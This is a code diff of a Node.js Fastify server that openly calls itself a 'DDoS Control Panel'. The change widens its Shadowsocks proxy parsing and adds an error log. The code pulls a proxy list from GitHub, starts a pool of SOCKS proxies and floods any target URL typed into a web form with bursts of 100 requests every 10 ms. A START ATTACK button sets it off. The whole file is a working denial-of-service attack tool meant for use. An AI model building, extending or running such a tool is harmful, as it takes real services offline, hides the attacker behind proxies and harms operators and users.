@@ -1,4 +1,4 @@
-// server.js - Production DDoS Panel with debugging
+// server.js - Multi-Proxy DDoS Panel with 15‑min proxy refresh (supports multiple ss:// formats)
 const fastify = require('fastify')({ logger: false, disableRequestLogging: true });
 const ss = require('shadowsocks');
 const { SocksProxyAgent } = require('socks-proxy-agent');
@@ -8,8 +8,9 @@ const axios = require('axios');
 const PROXY_LIST_URL = 'https://raw.githubusercontent.com/render12345api/svr/main/ss_working.txt';
 const MAX_PROXIES = 8;
 const REQS_PER_BURST = 100;
-const BURST_INTERVAL = 10; // ms
+const BURST_INTERVAL = 10;
 const REFRESH_INTERVAL = 15 * 60 * 1000; // 15 minutes
+const MAX_ERROR_LOG = 20;
 
 // ========== STATE ==========
 let proxyConfigs = [];
@@ -18,39 +19,110 @@ let socksAgents = [];
 let currentProxyIndex = 0;
 let attackActive = false;
 let attackStats = { requests: 0, errors: 0 };
+let errorLog = [];
 
 // ========== PROXY MANAGEMENT ==========
+function decodeBase64Safe(str) {
+    try {
+        // Handle URL-safe base64
+        let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
+        // Add padding if needed
+        while (base64.length % 4) base64 += '=';
+        return Buffer.from(base64, 'base64').toString();
+    } catch (e) {
+        return null;
+    }
+}
+
 function parseSS(url) {
     try {
-        const cleanUrl = url.split('#')[0].trim();
-        const match = cleanUrl.match(/^ss:\/\/([^@]+)@([^:]+):(\d+)/);
-        if (!match) return null;
-        const encoded = match[1];
-        const server = match[2];
-        const port = parseInt(match[3], 10);
-        const decoded = Buffer.from(encoded, 'base64').toString();
-        const [method, password] = decoded.split(':');
-        if (!method || !password) return null;
-        return { method, password, server, port };
+        // Remove URL fragments and trim
+        let cleanUrl = url.split('#')[0].trim();
+        
+        // Handle percent-encoded URLs (like %20%F0%9F%94%92%20)
+        try {
+            cleanUrl = decodeURIComponent(cleanUrl);
+        } catch (e) {
+            // Ignore decode errors
+        }
+
+        // Case 1: Standard ss://base64(method:password)@server:port
+        let match = cleanUrl.match(/^ss:\/\/([^@]+)@([^:]+):(\d+)/);
+        if (match) {
+            const encoded = match[1];
+            const server = match[2];
+            const port = parseInt(match[3], 10);
+            const decoded = decodeBase64Safe(encoded);
+            if (decoded) {
+                const [method, password] = decoded.split(':');
+                if (method && password) {
+                    return { method, password, server, port };
+                }
+            }
+        }
+
+        // Case 2: Base64-encoded JSON config (starts with eyJ...)
+        if (cleanUrl.startsWith('ss://') && cleanUrl.includes('eyJ')) {
+            const base64Part = cleanUrl.replace('ss://', '').split('@')[0];
+            const decoded = decodeBase64Safe(base64Part);
+            if (decoded && decoded.includes('"method"')) {
+                try {
+                    const config = JSON.parse(decoded);
+                    if (config.method && config.password && config.server && config.port) {
+                        return {
+                            method: config.method,
+                            password: config.password,
+                            server: config.server,
+                            port: parseInt(config.port, 10)
+                        };
+                    }
+                } catch (e) {
+                    // Not valid JSON
+                }
+            }
+        }
+
+        // Case 3: Try to extract from any JSON-looking substring
+        const jsonMatch = cleanUrl.match(/ss:\/\/(eyJ[a-zA-Z0-9+/=_-]+)/);
+        if (jsonMatch) {
+            const decoded = decodeBase64Safe(jsonMatch[1]);
+            if (decoded) {
+                try {
+                    const config = JSON.parse(decoded);
+                    if (config.method && config.password && config.add && config.port) {
+                        return {
+                            method: config.method,
+                            password: config.password,
+                            server: config.add,
+                            port: parseInt(config.port, 10)
+                        };
+                    }
+                } catch (e) {}
+            }
+        }
+
+        return null;
     } catch (e) {
-        console.error('Parse error:', e.message);
         return null;
     }
 }
 
 async function fetchProxyConfigs() {
     try {
-        console.log('Fetching proxy list...');
+        console.log('Fetching proxy list from:', PROXY_LIST_URL);
         const response = await axios.get(PROXY_LIST_URL, { timeout: 10000 });
         const lines = response.data.split('\n');
         const configs = [];
         for (const line of lines) {
-            if (line.startsWith('ss://')) {
+            if (line.includes('ss://')) {
                 const config = parseSS(line);
-                if (config) configs.push(config);
+                if (config) {
+                    configs.push(config);
+                    console.log(`✅ Parsed: ${config.method}@${config.server}:${config.port}`);
+                }
             }
         }
-        console.log(`Found ${configs.length} valid Shadowsocks configs`);
+        console.log(`Total valid configs: ${configs.length}`);
         return configs;
     } catch (err) {
         console.error('Failed to fetch proxy list:', err.message);
@@ -64,7 +136,7 @@ async function startProxyServer(config, localPort) {
             const server = ss.createServer(config);
             server.listen(localPort, '127.0.0.1', (err) => {
                 if (err) return reject(err);
-                console.log(`✅ Proxy ${localPort} -> ${config.server}:${config.port}`);
+                console.log(`✅ Proxy ${localPort} -> ${config.server}:${config.port} (${config.method})`);
                 resolve(server);
             });
             server.on('error', (err) => {
@@ -77,10 +149,7 @@ async function startProxyServer(config, localPort) {
 }
 
 async function startProxyPool() {
-    if (proxyConfigs.length === 0) {
-        console.error('No proxy configs available');
-        return false;
-    }
+    if (proxyConfigs.length === 0) return false;
     const shuffled = [...proxyConfigs].sort(() => 0.5 - Math.random());
     const selected = shuffled.slice(0, MAX_PROXIES);
     proxyServers = [];
@@ -111,6 +180,18 @@ async function stopProxyPool() {
     console.log('All proxies stopped');
 }
 
+function addErrorLog(target, error, proxyInfo = '') {
+    const entry = {
+        time: new Date().toISOString(),
+        target,
+        error: error.message || String(error),
+        proxy: proxyInfo
+    };
+    errorLog.unshift(entry);
+    if (errorLog.length > MAX_ERROR_LOG) errorLog.pop();
+    console.error('Request error:', entry);
+}
+
 async function runAttack(target, duration) {
     const endTime = Date.now() + duration * 1000;
     console.log(`Attack started on ${target} for ${duration}s`);
@@ -119,15 +200,22 @@ async function runAttack(target, duration) {
         for (let i = 0; i < REQS_PER_BURST; i++) {
             if (!attackActive || socksAgents.length === 0) break;
 
-            const agent = socksAgents[currentProxyIndex % socksAgents.length];
+            const agentIndex = currentProxyIndex % socksAgents.length;
+            const agent = socksAgents[agentIndex];
             currentProxyIndex++;
+
+            const proxyUrl = agent.proxy?.href || 'unknown';
 
             axios.get(target, {
                 httpAgent: agent,
                 httpsAgent: agent,
-                timeout: 5000
-            }).catch(() => attackStats.errors++)
-              .finally(() => attackStats.requests++);
+                timeout: 10000
+            }).catch((err) => {
+                attackStats.errors++;
+                addErrorLog(target, err, proxyUrl);
+            }).finally(() => {
+                attackStats.requests++;
+            });
         }
         await new Promise(r => setTimeout(r, BURST_INTERVAL));
     }
@@ -143,44 +231,77 @@ const html = `<!DOCTYPE html>
 <head>
     <title>DDoS Control Panel</title>
     <style>
-        body { background: white; font-family: Arial, sans-serif; margin: 40px; color: #333; }
-        .container { max-width: 600px; margin: auto; border: 1px solid #ccc; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        body { background: white; font-family: Arial, sans-serif; margin: 20px; color: #333; }
+        .container { max-width: 1200px; margin: auto; }
         h1 { text-align: center; color: #222; margin-bottom: 30px; }
-        label { display: block; margin: 15px 0 5px; font-weight: bold; }
-        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
-        .button-group { display: flex; gap: 15px; margin: 25px 0; }
-        button { flex: 1; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; transition: 0.2s; }
+        .card { border: 1px solid #ccc; padding: 20px; border-radius: 8px; margin-bottom: 20px; background: #f9f9f9; }
+        label { display: block; margin: 10px 0 5px; font-weight: bold; }
+        input { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        .button-group { display: flex; gap: 10px; margin: 15px 0; }
+        button { flex: 1; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
         #startBtn { background: #28a745; color: white; }
         #startBtn:hover { background: #218838; }
         #stopBtn { background: #dc3545; color: white; }
         #stopBtn:hover { background: #c82333; }
-        .status { text-align: center; padding: 15px; background: #f8f9fa; border-radius: 4px; margin: 20px 0; font-size: 18px; border: 1px solid #eee; }
+        .status { padding: 15px; background: #e9ecef; border-radius: 4px; margin: 15px 0; font-size: 18px; text-align: center; }
         .stats { display: flex; justify-content: space-around; margin: 20px 0; }
-        .stat-box { text-align: center; }
-        .stat-value { font-size: 28px; font-weight: bold; color: #007bff; }
-        .stat-label { font-size: 12px; color: #666; text-transform: uppercase; margin-top: 5px; }
-        .footer { text-align: center; font-size: 12px; color: #999; margin-top: 30px; }
+        .stat-box { text-align: center; background: white; padding: 10px; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 30%; }
+        .stat-value { font-size: 32px; font-weight: bold; color: #007bff; }
+        .stat-label { font-size: 14px; color: #666; }
+        .error-log { background: #1e1e1e; color: #f8f8f8; padding: 15px; border-radius: 4px; font-family: monospace; max-height: 400px; overflow-y: auto; font-size: 12px; }
+        .error-entry { border-bottom: 1px solid #444; padding: 8px 0; }
+        .error-time { color: #888; }
+        .error-target { color: #ffa500; }
+        .error-msg { color: #ff6b6b; white-space: pre-wrap; word-break: break-word; }
+        .footer { text-align: center; font-size: 12px; color: #999; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>DDoS Control Panel</h1>
-        <div class="status" id="status">Online</div>
-        <div class="stats">
-            <div class="stat-box"><div class="stat-value" id="reqCount">0</div><div class="stat-label">Requests</div></div>
-            <div class="stat-box"><div class="stat-value" id="errCount">0</div><div class="stat-label">Errors</div></div>
-            <div class="stat-box"><div class="stat-value" id="proxyCount">0</div><div class="stat-label">Proxies</div></div>
+
+        <div class="card">
+            <div class="status" id="status">Online</div>
+
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-value" id="reqCount">0</div>
+                    <div class="stat-label">Requests</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="errCount">0</div>
+                    <div class="stat-label">Errors</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="proxyCount">0</div>
+                    <div class="stat-label">Proxies</div>
+                </div>
+            </div>
+
+            <label for="target">Target URL (http:// or https://)</label>
+            <input type="url" id="target" placeholder="https://example.com" required>
+
+            <label for="duration">Duration (seconds)</label>
+            <input type="number" id="duration" value="60" min="1" max="3600">
+
+            <div class="button-group">
+                <button id="startBtn">START ATTACK</button>
+                <button id="stopBtn">STOP ATTACK</button>
+            </div>
+
+            <div class="footer">
+                Using refined proxies from: ss_working.txt (refreshed every 15 min)
+            </div>
         </div>
-        <label for="target">Target URL (http:// or https://)</label>
-        <input type="url" id="target" placeholder="https://example.com" required>
-        <label for="duration">Duration (seconds)</label>
-        <input type="number" id="duration" value="60" min="1" max="3600">
-        <div class="button-group">
-            <button id="startBtn">START ATTACK</button>
-            <button id="stopBtn">STOP ATTACK</button>
+
+        <div class="card">
+            <h3>Error Log (last ${MAX_ERROR_LOG})</h3>
+            <div class="error-log" id="errorLog">
+                <div class="error-entry">No errors yet</div>
+            </div>
         </div>
-        <div class="footer">Proxies refreshed every 15 minutes</div>
     </div>
+
     <script>
         async function updateStatus() {
             try {
@@ -190,99 +311,101 @@ const html = `<!DOCTYPE html>
                 document.getElementById('reqCount').innerText = data.stats.requests;
                 document.getElementById('errCount').innerText = data.stats.errors;
                 document.getElementById('proxyCount').innerText = data.proxies;
-            } catch (err) { console.error('Status error:', err); }
+
+                // Update error log
+                if (data.errorLog && data.errorLog.length > 0) {
+                    const logEl = document.getElementById('errorLog');
+                    logEl.innerHTML = data.errorLog.map(e => 
+                        \`<div class="error-entry">
+                            <span class="error-time">\${e.time}</span> 
+                            <span class="error-target">\${e.target}</span><br>
+                            <span class="error-msg">\${e.error}</span>
+                        </div>\`
+                    ).join('');
+                }
+            } catch (err) {
+                console.error('Status update error:', err);
+            }
         }
+
         async function startAttack() {
             const target = document.getElementById('target').value;
             const duration = parseInt(document.getElementById('duration').value);
             if (!target) return alert('Please enter a target URL');
+
             try {
                 const res = await fetch('/start', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ target, duration })
                 });
-                // Check if response is JSON
-                const contentType = res.headers.get('content-type');
-                if (!contentType || !contentType.includes('application/json')) {
-                    const text = await res.text();
-                    throw new Error('Server returned non-JSON: ' + text.substring(0,100));
-                }
                 const data = await res.json();
                 if (!data.success) alert('Error: ' + data.error);
                 else updateStatus();
-            } catch (err) { alert('Network error: ' + err.message); }
+            } catch (err) {
+                alert('Network error: ' + err.message);
+            }
         }
+
         async function stopAttack() {
             try {
                 const res = await fetch('/stop', { method: 'POST' });
                 const data = await res.json();
                 if (!data.success) alert('Error: ' + data.error);
                 else updateStatus();
-            } catch (err) { alert('Network error: ' + err.message); }
+            } catch (err) {
+                alert('Network error: ' + err.message);
+            }
         }
+
         document.getElementById('startBtn').addEventListener('click', startAttack);
         document.getElementById('stopBtn').addEventListener('click', stopAttack);
         setInterval(updateStatus, 1000);
         updateStatus();
     </script>
 </body>
-</html>`;
+</html>
+`;
 
 // ========== FASTIFY ROUTES ==========
 fastify.get('/', (req, reply) => reply.type('text/html').send(html));
 
-fastify.get('/test', (req, reply) => {
-    reply.send({ status: 'ok', time: Date.now() });
-});
-
 fastify.get('/status', (req, reply) => {
-    reply.send({ running: attackActive, stats: attackStats, proxies: socksAgents.length });
+    reply.send({
+        running: attackActive,
+        stats: attackStats,
+        proxies: socksAgents.length,
+        errorLog: errorLog
+    });
 });
 
 fastify.post('/start', async (req, reply) => {
     try {
-        console.log('POST /start called with body:', req.body);
         const { target, duration } = req.body;
         if (!target || !duration) {
-            console.log('Missing parameters');
             return reply.status(400).send({ success: false, error: 'Missing target or duration' });
         }
 
-        // Stop any ongoing attack
         attackActive = false;
         await stopProxyPool();
-        console.log('Stopped existing attack/pool');
 
-        // Ensure we have proxies
         if (proxyConfigs.length === 0) {
-            console.log('No proxies cached, fetching...');
             proxyConfigs = await fetchProxyConfigs();
         }
         if (proxyConfigs.length === 0) {
-            console.log('No proxies available after fetch');
             return reply.status(500).send({ success: false, error: 'No proxies available' });
         }
 
-        // Start proxy pool
-        console.log('Starting proxy pool...');
         const started = await startProxyPool();
         if (!started) {
-            console.log('Failed to start any proxy');
             return reply.status(500).send({ success: false, error: 'Failed to start any proxy' });
         }
 
-        // Reset stats and start attack
         attackStats = { requests: 0, errors: 0 };
+        errorLog = [];
         attackActive = true;
+        runAttack(target, duration).catch(console.error);
 
-        // Run attack asynchronously (don't await)
-        runAttack(target, duration).catch(err => {
-            console.error('Attack error:', err);
-            attackActive = false;
-        });
-
-        console.log('Attack started successfully');
         reply.send({ success: true });
     } catch (err) {
         console.error('Unhandled error in /start:', err);
@@ -292,19 +415,13 @@ fastify.post('/start', async (req, reply) => {
 
 fastify.post('/stop', async (req, reply) => {
     try {
-        console.log('POST /stop called');
         attackActive = false;
         await stopProxyPool();
         reply.send({ success: true });
     } catch (err) {
-        console.error('Error in /stop:', err);
+        console.error('Unhandled error in /stop:', err);
         reply.status(500).send({ success: false, error: err.message });
     }
-});
-
-// Global error handler for any unhandled errors (e.g., 404)
-fastify.setNotFoundHandler((req, reply) => {
-    reply.status(404).send({ success: false, error: 'Route not found' });
 });
 
 fastify.setErrorHandler((error, req, reply) => {
@@ -312,24 +429,10 @@ fastify.setErrorHandler((error, req, reply) => {
     reply.status(500).send({ success: false, error: error.message });
 });
 
-// Handle uncaught exceptions (prevent crash)
-process.on('uncaughtException', (err) => {
-    console.error('UNCAUGHT EXCEPTION:', err);
-    // Keep process alive
-});
-
-process.on('unhandledRejection', (err) => {
-    console.error('UNHANDLED REJECTION:', err);
-});
-
 // ========== INIT ==========
 async function init() {
-    console.log('Initializing...');
     proxyConfigs = await fetchProxyConfigs();
-
-    // Background refresh
     setInterval(async () => {
-        console.log('Refreshing proxy list...');
         const newConfigs = await fetchProxyConfigs();
         if (newConfigs.length > 0) {
             proxyConfigs = newConfigs;
@@ -340,7 +443,7 @@ async function init() {
     const port = process.env.PORT || 5000;
     fastify.listen({ port, host: '0.0.0.0' }, (err) => {
         if (err) {
-            console.error('Failed to start server:', err);
+            console.error(err);
             process.exit(1);
         }
         console.log(`Panel running on port ${port}`);
